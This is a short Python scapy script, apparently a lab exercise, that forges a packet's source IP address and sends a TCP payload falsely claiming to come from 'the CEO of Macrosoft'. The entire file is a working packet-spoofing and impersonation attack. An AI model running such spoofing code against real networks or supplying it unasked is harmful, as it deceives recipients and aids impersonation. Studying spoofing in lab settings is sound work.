from scapy.all import *

source = '123.45.67.89'
dest = '172.17.14.180'
src_port = 2000
dest_port = 3500
payload = 'This is the CEO of Macrosoft contacting you.'

spoofed = IP(src=source, dst=dest) / TCP(sport=src_port, dport=dest_port) / payload
send(spoofed)